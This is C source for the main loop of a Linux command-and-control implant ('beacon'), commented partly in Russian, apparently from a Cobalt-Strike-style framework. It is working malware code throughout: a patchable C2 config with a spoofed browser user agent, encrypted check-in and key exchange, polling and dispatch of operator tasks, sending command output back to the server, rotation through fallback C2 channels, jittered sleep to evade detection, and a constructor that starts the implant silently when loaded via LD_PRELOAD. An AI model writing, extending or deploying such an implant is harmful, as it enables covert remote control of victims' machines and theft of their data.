// Main beacon loop: checkin → poll tasks → execute → submit output → sleep.
// Layout mirrors the Windows beacon (beacon/core/main.c).

#include "beacon.h"
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <pthread.h>

// ---- Global state in .co2cfg section (sentinel for artifact-gen) -----------
// artifact-gen scans for: 32 zero bytes (listener_key) + UTF-16LE "127.0.0.1\0"

CO2_CFG_SECTION
static BeaconState g_state = {
    .listener_key = { 0 },
    // UTF-16LE "127.0.0.1" — each char stored as uint16_t little-endian
    .host = { '1', '2', '7', '.', '0', '.', '0', '.', '1', 0 },
    .port = 443,
    .uri_checkin = { '/', 's', 'e', 'a', 'r', 'c', 'h', 0 },
    .uri_task    = { '/', 'a', 'p', 'i', '/', 'f', 'e', 'e', 'd', 0 },
    .uri_post    = { '/', 's', 'u', 'b', 'm', 'i', 't', 0 },
    .user_agent  = { 'M','o','z','i','l','l','a','/','5','.','0',' ',
                     '(','X','1','1',';',' ','L','i','n','u','x',' ',
                     'x','8','6','_','6','4',')', 0 },
    .metadata_cookie = { 's', 'i', 'd', 0 },
    .sleep_ms  = 100,
    .jitter_pct = 0,
};

BeaconState* beacon_state(void) { return &g_state; }

// ---- Cached UTF-8 versions of patched fields -------------------------------
static char g_host_utf8[256];
static char g_uri_checkin_utf8[256];
static char g_uri_task_utf8[256];
static char g_uri_post_utf8[256];
static char g_user_agent_utf8[512];
static char g_cookie_name_utf8[128];

const char* beacon_host(void)       { return g_host_utf8; }
const char* beacon_uri_checkin(void) { return g_uri_checkin_utf8; }
const char* beacon_uri_task(void)   { return g_uri_task_utf8; }
const char* beacon_uri_post(void)   { return g_uri_post_utf8; }
const char* beacon_user_agent(void) { return g_user_agent_utf8; }
const char* beacon_cookie_name(void){ return g_cookie_name_utf8; }

static void convert_fields(void) {
    utf16le_to_utf8(g_state.host, 128, g_host_utf8, sizeof(g_host_utf8));
    utf16le_to_utf8(g_state.uri_checkin, 128, g_uri_checkin_utf8, sizeof(g_uri_checkin_utf8));
    utf16le_to_utf8(g_state.uri_task, 128, g_uri_task_utf8, sizeof(g_uri_task_utf8));
    utf16le_to_utf8(g_state.uri_post, 128, g_uri_post_utf8, sizeof(g_uri_post_utf8));
    utf16le_to_utf8(g_state.user_agent, 256, g_user_agent_utf8, sizeof(g_user_agent_utf8));
    utf16le_to_utf8(g_state.metadata_cookie, 64, g_cookie_name_utf8, sizeof(g_cookie_name_utf8));
}

// ---- Output queue ----------------------------------------------------------
static uint8_t*  g_outbuf      = NULL;
static size_t    g_outbuf_cap  = 0;
static size_t    g_outlen      = 0;
static uint64_t  g_out_task_id = 0;
static uint16_t  g_out_resp    = 0;
static int       g_out_done    = 0;

static const TransportVtbl* g_transport = NULL;
const TransportVtbl* get_transport(void) { return g_transport; }

void out_begin(uint64_t task_id, uint16_t resp) {
    g_out_task_id = task_id;
    g_out_resp    = resp;
    g_outlen      = 0;
    g_out_done    = 0;
    if (!g_outbuf) {
        g_outbuf     = (uint8_t*)bmalloc(OUT_CHUNK_BYTES);
        g_outbuf_cap = g_outbuf ? OUT_CHUNK_BYTES : 0;
    }
}

size_t out_remaining(void) {
    if (!g_outbuf || g_outbuf_cap == 0) return 0;
    return (g_outlen < g_outbuf_cap) ? (g_outbuf_cap - g_outlen) : 0;
}

void out_write(const void* data, size_t len) {
    if (!g_outbuf) return;
    if (g_outlen + len > g_outbuf_cap) len = g_outbuf_cap - g_outlen;
    if (!len) return;
    memcpy(g_outbuf + g_outlen, data, len);
    g_outlen += len;
}

void out_flush_chunk(const TransportVtbl* t, uint32_t is_last) {
    if (g_out_done) return;
    if (g_outlen == 0 && !is_last) return;

    size_t kv_cap = g_outlen + 256;
    uint8_t* kvbuf = (uint8_t*)bmalloc(kv_cap);
    if (!kvbuf) { if (is_last) g_out_done = 1; return; }
    kv_reset(kvbuf, kv_cap);
    kv_put_u64("task_id", g_out_task_id);
    kv_put_u32("resp",    g_out_resp);
    kv_put_u32("is_last", is_last);
    if (g_outbuf && g_outlen)
        kv_put_bytes("output", g_outbuf, (uint32_t)g_outlen);
    size_t klen = kv_finish(NULL);

    size_t frame_cap = klen + 64;
    uint8_t* frame = (uint8_t*)bmalloc(frame_cap);
    if (frame) {
        size_t flen = seal_frame(g_state.session_key, kvbuf, klen, frame);
        if (flen && t && t->submit_output)
            t->submit_output(frame, flen);
        bfree(frame);
    }
    bfree(kvbuf);
    g_outlen = 0;
    if (is_last) g_out_done = 1;
}

void out_flush_via_transport(const TransportVtbl* t) {
    out_flush_chunk(t, 1);
}

void out_mark_done(void) {
    g_out_done = 1;
}

// ---- Прямая отправка кадра минуя общий выходной буфер -------------------
// Используется relay (OP_RELAY_*) для отправки данных
// с магическим task_id, которые сервер маршрутизирует отдельно.
void transport_direct_send_typed(const TransportVtbl* t, uint64_t task_id,
                                  uint32_t resp_type,
                                  const uint8_t* data, size_t len) {
    if (!t || !t->submit_output) return;
    size_t kv_cap = (len > 0 ? len : 0) + 128;
    uint8_t* kvbuf = (uint8_t*)bmalloc(kv_cap);
    if (!kvbuf) return;
    kv_reset(kvbuf, kv_cap);
    kv_put_u64("task_id", task_id);
    kv_put_u32("resp",    resp_type);
    kv_put_u32("is_last", 1);
    if (data && len)
        kv_put_bytes("output", data, (uint32_t)len);
    size_t klen = kv_finish(NULL);
    size_t frame_cap = klen + 64;
    uint8_t* frame = (uint8_t*)bmalloc(frame_cap);
    if (frame) {
        size_t flen = seal_frame(g_state.session_key, kvbuf, klen, frame);
        if (flen) t->submit_output(frame, flen);
        bfree(frame);
    }
    bfree(kvbuf);
}

void transport_direct_send(const TransportVtbl* t, uint64_t task_id,
                           const uint8_t* data, size_t len) {
    transport_direct_send_typed(t, task_id, RESP_OUTPUT, data, len);
}

// ---- Fallback channel rotation --------------------------------------------

static uint32_t g_fail_count = 0;     // последовательных неудач poll_tasks
static uint8_t  g_current_fb = 0xFF;  // 0xFF = основной канал, 0..N = fallback слот

// Переключить бикон на следующий C2-канал (основной → fb[0] → fb[1] → ... → основной).
static void switch_to_next_channel(void) {
    BeaconState* s = &g_state;
    if (s->fallback_count == 0) return;  // нет fallback'ов

    uint8_t next;
    if (g_current_fb == 0xFF) {
        next = 0;  // основной → первый fallback
    } else {
        next = g_current_fb + 1;
        if (next >= s->fallback_count) next = 0xFF;  // обратно на основной
    }

    // Сохраняем текущий канал в fallback-слот (для возврата) перед переключением.
    // При первом переключении сохраняем основной канал в специальные переменные.
    static uint16_t saved_host[128];
    static uint16_t saved_port;
    static uint16_t saved_uri_checkin[128];
    static int      saved = 0;

    if (!saved) {
        // Сохраняем оригинальные значения основного канала
        memcpy(saved_host, s->host, sizeof(saved_host));
        saved_port = s->port;
        memcpy(saved_uri_checkin, s->uri_checkin, sizeof(saved_uri_checkin));
        saved = 1;
    }

    if (next == 0xFF) {
        // Возврат на основной канал
        memcpy(s->host, saved_host, sizeof(s->host));
        s->port = saved_port;
        memcpy(s->uri_checkin, saved_uri_checkin, sizeof(s->uri_checkin));
        bdbg("[beacon] fallback: switched back to PRIMARY channel\n");
    } else {
        FallbackSlot* fb = &s->fallback[next];
        memcpy(s->host, fb->host, sizeof(s->host));
        s->port = fb->port;
        memcpy(s->uri_checkin, fb->uri_checkin, sizeof(s->uri_checkin));
        bdbg("[beacon] fallback: switched to slot ");
        // Простой вывод номера слота
        char nb[4] = { (char)('0' + next), '\n', 0, 0 };
        bdbg(nb);
    }

    g_current_fb = next;
    g_fail_count = 0;

    // Пересчитать UTF-8 кеши и пересоздать транспорт
    convert_fields();
    g_transport = select_transport();

    // Нужен повторный checkin на новом канале
    s->checkin_done = 0;
}

// ---- Jitter helper ---------------------------------------------------------

static uint32_t apply_jitter(uint32_t base, uint8_t jpct) {
    if (!jpct) return base;
    uint8_t r; bc_random(&r, 1);
    uint32_t span = base * jpct / 100u;
    uint32_t delta = span ? ((uint32_t)r * span) / 255u : 0;
    return base + delta - span / 2;
}

static void jittered_sleep(uint32_t ms, uint8_t jpct) {
    uint32_t actual = apply_jitter(ms, jpct);
    struct timespec ts;
    ts.tv_sec  = actual / 1000;
    ts.tv_nsec = (actual % 1000) * 1000000L;
    nanosleep(&ts, NULL);
}

// ---- Initial checkin -------------------------------------------------------

static void initial_checkin(const TransportVtbl* t) {
    // Generate per-session AES key if RSA pubkey is available
    uint8_t  wrapped[512];
    uint32_t wrapped_len = 0;

    if (g_state.rsa_pub_len > 0) {
        bc_random(g_state.session_key, sizeof(g_state.session_key));
        size_t w = rsa_oaep_encrypt(g_state.rsa_pub_blob, g_state.rsa_pub_len,
                                    g_state.session_key,
                                    (uint32_t)sizeof(g_state.session_key),
                                    wrapped, sizeof(wrapped));
        if (!w) {
            bdbg("[beacon] checkin: rsa_oaep_encrypt failed, fallback to listener_key\n");
            memcpy(g_state.session_key, g_state.listener_key,
                   sizeof(g_state.session_key));
        } else {
            wrapped_len = (uint32_t)w;
        }
    } else {
        memcpy(g_state.session_key, g_state.listener_key,
               sizeof(g_state.session_key));
    }

    // Build metadata blob
    uint8_t meta[4096];
    size_t mlen = build_metadata(meta, sizeof(meta),
                                 wrapped_len ? wrapped : NULL, wrapped_len);

    // Seal with listener_key (server decrypts checkin with listener_key)
    uint8_t frame[4608];
    size_t flen = seal_frame(g_state.listener_key, meta, mlen, frame);
    if (!flen) { bdbg("[beacon] checkin: seal_frame failed\n"); return; }

    bdbg("[beacon] checkin: calling transport->checkin\n");
    uint8_t reply[4608]; size_t rlen = sizeof(reply);
    int rc = t->checkin(frame, flen, reply, &rlen);
    if (rc != 0) { bdbg("[beacon] checkin: transport failed\n"); return; }
    if (rlen == 0) { bdbg("[beacon] checkin: empty reply\n"); return; }

    // Server encrypts reply with listener_key
    uint8_t pt[4608];
    size_t plen = open_frame(g_state.listener_key, reply, rlen, pt);
    if (!plen) { bdbg("[beacon] checkin: open_frame failed\n"); return; }

    // Extract beacon_id from response
    char idbuf[64] = {0};
    if (kv_get_str(pt, plen, "beacon_id", idbuf, sizeof(idbuf))) {
        size_t n = strlen(idbuf);
        if (n > sizeof(g_state.beacon_id) - 1) n = sizeof(g_state.beacon_id) - 1;
        memcpy(g_state.beacon_id, idbuf, n);
        g_state.beacon_id[n] = 0;
        g_state.checkin_done = 1;
        bdbg("[beacon] checkin: SUCCESS\n");
    } else {
        bdbg("[beacon] checkin: no beacon_id in reply\n");
    }
}

// ---- Beacon loop (shared between EXE and SO entry points) ------------------

static void beacon_run(void) {
    bdbg("[beacon] beacon_run: entered\n");

    // Convert UTF-16LE fields to UTF-8 for use with POSIX/OpenSSL APIs
    convert_fields();

    g_transport = select_transport();

    while (!g_state.quit) {
        if (!g_state.checkin_done) {
            initial_checkin(g_transport);
            if (!g_state.checkin_done) {
                g_fail_count++;
                if (g_fail_count >= FALLBACK_MAX_FAILS) {
                    switch_to_next_channel();
                    continue;
                }
                sleep(3);
                continue;
            }
        }

        // Poll for tasks
        uint8_t* tframe = (uint8_t*)bmalloc(2 * 1024 * 1024);
        if (!tframe) { bdbg("[beacon] poll: bmalloc failed\n"); continue; }
        size_t tlen = 2 * 1024 * 1024;
        int rc = g_transport->poll_tasks(tframe, &tlen);

        if (rc == 0 && tlen > 0) {
            g_fail_count = 0;  // сброс счётчика при успехе
            uint8_t* pt = (uint8_t*)bmalloc(2 * 1024 * 1024);
            if (!pt) { bfree(tframe); jittered_sleep(g_state.sleep_ms, g_state.jitter_pct); continue; }
            size_t plen = open_frame(g_state.session_key, tframe, tlen, pt);
            if (plen) {
                uint32_t count = 0;
                kv_get_u32(pt, plen, "count", &count);
                for (uint32_t i = 0; i < count; ++i) {
                    // Build indexed key names: id_0, op_0, payload_0, etc.
                    char kid[24], kop[24], kpay[24];
                    char ibuf[12]; int n = 0; uint32_t v = i;
                    if (!v) ibuf[n++] = '0';
                    else { char t2[12]; int m = 0; while (v) { t2[m++] = (char)('0' + v%10); v/=10; } while (m) ibuf[n++] = t2[--m]; }
                    ibuf[n] = 0;
                    memcpy(kid,  "id_",      3); memcpy(kid+3,  ibuf, n+1);
                    memcpy(kop,  "op_",      3); memcpy(kop+3,  ibuf, n+1);
                    memcpy(kpay, "payload_", 8); memcpy(kpay+8, ibuf, n+1);

                    BeaconTask task;
                    memset(&task, 0, sizeof(task));
                    kv_get_u64(pt, plen, kid, &task.id);
                    uint32_t op32 = 0;
                    kv_get_u32(pt, plen, kop, &op32);
                    task.op = (uint16_t)op32;
                    const uint8_t* pv = NULL; uint32_t pl = 0;
                    if (kv_find(pt, plen, kpay, &pv, &pl)) {
                        task.pay = (uint8_t*)pv;
                        task.pay_len = pl;
                    }

                    cmd_dispatch(&task);
                    out_flush_via_transport(g_transport);
                    // Сбросить накопленные relay/rportfwd-кадры после каждой команды.
                    relay_flush_pending(g_transport);
                    rportfwd_flush_pending(g_transport);
                }
            } else {
                bdbg("[beacon] poll: open_frame failed\n");
            }
            bfree(pt);
        }
        if (rc != 0) {
            g_fail_count++;
            bdbg("[beacon] poll failed, fail_count++\n");
            if (g_fail_count >= FALLBACK_MAX_FAILS) {
                switch_to_next_channel();
                bfree(tframe);
                continue;  // сразу попробовать checkin на новом канале
            }
        }
        bfree(tframe);

        // Flush pending interactive shell output (long-running commands)
        ishell_pump();

        // Сбросить relay/rportfwd-кадры, накопленные в фоне между задачами.
        relay_flush_pending(g_transport);
        rportfwd_flush_pending(g_transport);

        // Check if connection lost (stateless HTTPS — always 0)
        if (g_transport->connection_lost && g_transport->connection_lost()) {
            bdbg("[beacon] connection lost, will re-checkin\n");
            g_state.checkin_done = 0;
        }

        // Jittered sleep
        if (g_state.sleep_ms) {
            jittered_sleep(g_state.sleep_ms, g_state.jitter_pct);
        }
    }

    bdbg("[beacon] exiting\n");
}

// ---- Entry points ----------------------------------------------------------

#ifndef CO2H_SHARED
// ELF executable: standard main()
int main(void) {
    beacon_run();
    return 0;
}
#else
// Shared library (.so): запуск в отдельном потоке при dlopen/LD_PRELOAD
static void* beacon_thread(void* arg) {
    (void)arg;
    beacon_run();
    return NULL;
}

__attribute__((constructor))
static void beacon_init(void) {
    pthread_t th;
    pthread_create(&th, NULL, beacon_thread, NULL);
    pthread_detach(th);
}
#endif
